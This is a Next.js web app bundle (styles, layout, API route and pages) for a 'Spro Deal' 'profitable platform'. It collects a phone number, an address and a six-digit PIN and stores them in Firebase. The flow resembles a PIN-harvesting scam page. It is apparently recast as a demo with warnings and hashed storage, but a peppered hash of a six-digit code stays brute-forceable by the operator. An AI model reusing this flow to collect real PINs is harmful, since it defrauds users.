

/* Existing Spro Deal styles combined for the Next.js pages */



*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
background:#ffffff;
display:flex;
justify-content:center;
min-height:100vh;
}
    #loading{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,.95);
    display:none;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    z-index:9999;
}

.loader{
    width:55px;
    height:55px;
    border:5px solid #e5e5e5;
    border-top:5px solid #63d12f;
    border-radius:50%;
    animation:spin .8s linear infinite;
}

#loading p{
    margin-top:18px;
    font-size:16px;
    font-weight:600;
    color:#444;
}

@keyframes spin{
    from{
        transform:rotate(0deg);
    }
    to{
        transform:rotate(360deg);
    }
}

.container{
width:100%;
max-width:430px;
background:#fff;
position:relative;
overflow:hidden;
min-height:100vh;
}

.header{
background:#63d12f;
height:200px;
display:flex;
justify-content:center;
align-items:center;
flex-direction:column;
color:white;
border-bottom-left-radius:40% 9%;
border-bottom-right-radius:40% 9%;
}

.logo{
width:70px;
height:70px;
object-fit:contain;
margin-bottom:12px;
}
.logo-glow{
    width:90px;
    height:90px;
    display:flex;
    justify-content:center;
    align-items:center;
    border-radius:50%;
    animation: glow 1.5s infinite alternate;
}

.logo{
    width:70px;
    height:70px;
    object-fit:contain;
}

@keyframes glow{
    0%{
        box-shadow:
        0 0 10px #00e5ff,
        0 0 20px #00e5ff,
        0 0 35px #00e5ff;
    }

    25%{
        box-shadow:
        0 0 10px #00ff88,
        0 0 20px #00ff88,
        0 0 35px #00ff88;
    }

    50%{
        box-shadow:
        0 0 10px #00bfff,
        0 0 20px #00bfff,
        0 0 35px #00bfff;
    }

    75%{
        box-shadow:
        0 0 10px #7c4dff,
        0 0 20px #7c4dff,
        0 0 35px #7c4dff;
    }

    100%{
        box-shadow:
        0 0 10px #00e5ff,
        0 0 20px #00e5ff,
        0 0 35px #00e5ff;
    }
}
.brand{
font-size:30px;
font-weight:300;
}

.tagline{
font-size:18px;
font-weight:300;
margin-top:8px;
}

.content{
padding:30px;
margin-top:-10px;
}


h1{
    text-align:center;
    font-size:22px;
    font-weight:700;
    color:#000;
    margin-bottom:35px;
}

.title-line{
    display:inline-block;
    position:relative;
    padding-bottom:1px;
}

.title-line::after{
    content:"";
    position:absolute;
    left:0;
    bottom:0;
    width:100%;
    height:3px;
    background:#63d12f;
    border-radius:10px;
}

.green{
color:#58c42c;
}

label{
display:block;
font-size:12px;
margin-bottom:8px;
color:#444;
}

.inputBox{
height:45px;
border:2px solid #e6e6e6;
border-radius:25px;
display:flex;
align-items:center;
padding:0 20px;
margin-bottom:24px;
}

.country{
font-weight:600;
font-size:18px;
color:#444;
margin-right:10px;
}

.divider{
width:1px;
height:26px;
background:#cfcfcf;
margin-right:12px;
}

input{
border:none;
outline:none;
width:100%;
font-size:17px;
background:transparent;
}

button{
width:100%;
height:45px;
border:none;
border-radius:12px;
background:#d7d7d7;
font-size:20px;
color:white;
font-weight:600;
cursor:pointer;
transition:.3s;
}

button.active{
background:#63d12f;
}

.policy{
    display:flex;
    align-items:flex-start;
    gap:10px;
    margin-top:25px;
}

.policy input[type="checkbox"]{
    width:18px;
    height:18px;
    accent-color:#63d12f;
    margin-top:3px;
    cursor:pointer;
}

.policy-text{
    font-size:15px;
    color:#666;
    line-height:22px;
    cursor:pointer;
}

.policy-text a{
    color:#63d12f;
    text-decoration:none;
    font-weight:500;
}

    

.logo{
    width:60px;
    height:60px;
    object-fit:contain;
}

    
.check{
color:#63d12f;
font-size:22px;
margin-right:8px;
}

.policy a{
text-decoration:none;
color:#63d12f;
}

.create{
margin-top:25px;
text-align:center;
}

.create a{
font-size:18px;
font-weight:600;
text-decoration:none;
color:#63d12f;
}
    @keyframes telegramGlow{

    0%{
        transform:scale(1);
        box-shadow:0 0 8px #229ED9;
    }

    50%{
        transform:scale(1.15);
        box-shadow:
        0 0 10px #229ED9,
        0 0 20px #00BFFF,
        0 0 35px #00E5FF,
        0 0 50px #00E5FF;
    }

    100%{
        transform:scale(1);
        box-shadow:0 0 8px #229ED9;
    }

}


.telegram{
    position:fixed;
    right:25px;
    bottom:30px;
    width:45px;
    height:45px;
    border-radius:50%;
    background:#229ED9;
    display:flex;
    justify-content:center;
    align-items:center;
    text-decoration:none;
    animation:telegramGlow 1.5s ease-in-out infinite;
}

.telegram i{
    color:#fff;
    font-size:30px;
}

@media(max-width:450px){

.content{
padding:22px;
}

.header{
height:180px;
}

.tagline{
font-size:16px;
}

}





*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
background:#f5f5f5;
display:flex;
justify-content:center;
min-height:100vh;
}

.container{
width:100%;
max-width:430px;
background:#fff;
min-height:100vh;
position:relative;
overflow:hidden;
}

.header{
background:#63d12f;
height:230px;
display:flex;
flex-direction:column;
justify-content:center;
align-items:center;
color:#fff;
border-bottom-left-radius:45% 10%;
border-bottom-right-radius:45% 10%;
}

.logo{
width:80px;
margin-bottom:12px;
}

.brand{
font-size:30px;
font-weight:600;
}

.tagline{
font-size:18px;
font-weight:300;
margin-top:8px;
}


.card{
    width:90%;
    margin:6px auto 0;   /* Niche aa jayega */
    background:#fff;
    border-radius:22px;
    padding:30px 18px;
    box-shadow:0 10px 30px rgba(0,0,0,.12);
}
  

.card h2{
text-align:center;
font-size:20px;
font-weight: 500;
margin-bottom:6px;
color:#111;
}

.card p{
text-align:center;
font-size:16px;
font-weight:600;
margin-bottom:22px;
color:#444;
}

.pin-box{
display:flex;
justify-content:space-between;
gap:8px;
  margin-top:25px; 
}

.pin-box input{
flex:1;
max-width:40px;
height:45px;
border:2px solid #d9d9d9;
border-radius:12px;
font-size:24px;
font-weight:700;
text-align:center;
outline:none;
transition:.25s;
}

.pin-box input:focus{
border-color:#63d12f;
box-shadow:0 0 8px rgba(99,209,47,.35);
}

.forgot{

text-align:center;
margin-top:30px;

}

.forgot a{

text-decoration:none;
color:#63d12f;
font-weight:600;

}





*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    background:#f5f5f5;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.container{
    width:100%;
    max-width:430px;
    background:#fff;
    min-height:100vh;
    overflow:hidden;
}

.header{
    background:#63d12f;
    height:230px;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    color:#fff;
    border-bottom-left-radius:45% 10%;
    border-bottom-right-radius:45% 10%;
}

.logo{
    width:80px;
    margin-bottom:12px;
}

.brand{
    font-size:30px;
    font-weight:600;
}

.tagline{
    font-size:18px;
    font-weight:300;
    margin-top:8px;
}

.card{
    width:90%;
    margin:25px auto;
    background:#fff;
    border-radius:22px;
    padding:35px 25px;
    box-shadow:0 10px 30px rgba(0,0,0,.12);
    text-align:center;
}

.success{
    width:80px;
    height:80px;
    margin:0 auto 25px;
    border-radius:50%;
    background:#63d12f;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:42px;
}

.card h2{
    font-size:24px;
    color:#222;
    margin-bottom:18px;
}

.card p{
    color:#666;
    line-height:28px;
    font-size:16px;
}

#countdown{
    margin-top:35px;
    font-size:24px;
    font-weight:700;
    color:#63d12f;
}

.progress{
    width:100%;
    height:8px;
    background:#e8e8e8;
    border-radius:50px;
    overflow:hidden;
    margin-top:30px;
}

.bar{
    width:100%;
    height:100%;
    background:#63d12f;
    animation:progress 5s linear forwards;
}

@keyframes progress{
    from{
        width:0%;
    }
    to{
        width:100%;
    }
}


body { margin:0; }
button, input { font: inherit; }
.demo-note { text-align:center; color:#777; font-size:11px; line-height:1.5; margin:12px auto 0; max-width:310px; }
.pin-note { text-align:center; color:#777; font-size:11px; line-height:1.5; margin-top:16px; }
.form-error { color:#c62828; text-align:center; font-size:12px; margin-top:10px; }

import './globals.css';

export const metadata = {
  title: 'Spro Deal',
  description: 'Spro Deal demo website',
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
      </head>
      <body>{children}</body>
    </html>
  );
}

import { NextResponse } from "next/server";
import { cert, getApps, initializeApp } from "firebase-admin/app";
import { getDatabase } from "firebase-admin/database";
import { randomBytes, scrypt as scryptCallback } from "node:crypto";
import { promisify } from "node:util";

export const runtime = "nodejs";
const scrypt = promisify(scryptCallback);

function getAdminApp() {
  if (getApps().length) return getApps()[0];
  const raw = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;
  if (!raw) throw new Error("Firebase server credentials are not configured.");
  return initializeApp({
    credential: cert(JSON.parse(raw)),
    databaseURL: process.env.FIREBASE_DATABASE_URL,
  });
}

export async function POST(request) {
  try {
    const body = await request.json();
    const phone = String(body.phone || "").replace(/\D/g, "");
    const address = String(body.address || "").trim();
    const pin = String(body.demoCode || "");

    if (body.demo !== true || !/^[0-9]{10}$/.test(phone) ||
        address.length < 3 || address.length > 250 ||
        !/^[0-9]{6}$/.test(pin)) {
      return NextResponse.json({ success: false, message: "Invalid demo details." }, { status: 400 });
    }

    // A six-digit value has low entropy. Use a unique salt plus a server-only pepper
    // and a deliberately expensive KDF. Never log or return the submitted value.
    const pepper = process.env.DEMO_CODE_PEPPER;
    if (!pepper || pepper.length < 32) {
      return NextResponse.json({ success: false, message: "Server demo-code protection is not configured." }, { status: 503 });
    }
    const salt = randomBytes(16);
    const derived = await scrypt(`${pin}:${pepper}`, salt, 64, { N: 16384, r: 8, p: 1, maxmem: 64 * 1024 * 1024 });

    const db = getDatabase(getAdminApp());
    await db.ref("demo_submissions").push({
      phone,
      address,
      demoCodeHash: derived.toString("hex"),
      demoCodeSalt: salt.toString("hex"),
      demo: true,
      createdAt: Date.now(),
    });

    return NextResponse.json({ success: true });
  } catch {
    return NextResponse.json({ success: false, message: "Demo submission could not be saved." }, { status: 503 });
  }
}

"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function Dashboard() {
  const router = useRouter();
  const [count, setCount] = useState(5);

  useEffect(() => {
    if (sessionStorage.getItem("demoPinCompleted") !== "true") {
      router.replace("/");
      return;
    }
    const timer = setInterval(() => setCount(value => value > 1 ? value - 1 : 0), 1000);
    return () => clearInterval(timer);
  }, [router]);

  useEffect(() => {
    if (count === 0) {
      sessionStorage.removeItem("demoPhone");
      sessionStorage.removeItem("demoAddress");
      sessionStorage.removeItem("demoPinCompleted");
      router.replace("/");
    }
  }, [count, router]);

  return (
    <div className="container">
      <div className="header">
        <img className="logo" src="/IMG_1057.png" alt="Spro Deal logo" />
        <div className="brand">Spro Deal</div>
        <div className="tagline">A stable and profitable platform</div>
      </div>
      <div className="card">
        <div className="success">✓</div>
        <h2>Registration Successfully</h2>
        <p>Your demo submission has been processed.</p>
        <div id="countdown">Redirecting in {count} sec...</div>
        <div className="progress"><div className="bar"></div></div>
        <div className="demo-note">Your demo code is not displayed. Only its protected hash is stored.</div>
      </div>
    </div>
  );
}

"use client";
import { useRef, useState } from "react";
import { useRouter } from "next/navigation";

export default function PinPage() {
  const router = useRouter();
  const refs = useRef([]);
  const [digits, setDigits] = useState(["","","","","",""]);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  async function updateDigit(value, index) {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[index] = digit;
    setDigits(next);
    setError("");
    if (digit && index < 5) refs.current[index + 1]?.focus();
    if (next.every(Boolean) && !busy) {
      setBusy(true);
      try {
        const phone = sessionStorage.getItem("demoPhone");
        const address = sessionStorage.getItem("demoAddress");
        if (!phone || !address) throw new Error("Your demo details expired. Please start again.");
        const response = await fetch("/api/demo-submissions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phone, address, demoCode: next.join(""), demo: true })
        });
        const result = await response.json();
        if (!response.ok || !result.success) throw new Error(result.message || "Could not submit demo details.");
        sessionStorage.setItem("demoPinCompleted", "true");
        router.replace("/dashboard");
      } catch (err) {
        setError(err.message || "Please try again.");
        setDigits(["","","","","",""]);
        refs.current[0]?.focus();
      } finally {
        setBusy(false);
      }
    }
  }

  function onKeyDown(e, index) {
    if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
  }

  return (
    <div className="container">
      <div className="header">
        <img className="logo" src="/IMG_1057.png" alt="Spro Deal logo" />
        <div className="brand">Spro Deal</div>
        <div className="tagline">A stable and profitable platform</div>
      </div>
      <div className="card">
        <h2>ENTER YOUR PIN</h2>
        <p>6-digit demo code</p>
        <div className="pin-box">
          {digits.map((digit, index) => (
            <input key={index} ref={el => refs.current[index] = el}
              type="password" inputMode="numeric" autoComplete="off" maxLength={1}
              aria-label={`Demo code digit ${index + 1}`} value={digit}
              disabled={busy}
              onChange={e => updateDigit(e.target.value, index)}
              onKeyDown={e => onKeyDown(e, index)} />
          ))}
        </div>
        <div className="pin-note">Demo code only. Do not enter a PIN used for any real account. The code is stored only as a protected hash.</div>
        {busy && <div className="demo-note">Submitting securely…</div>}
        {error && <div className="form-error">{error}</div>}
      </div>
    </div>
  );
}
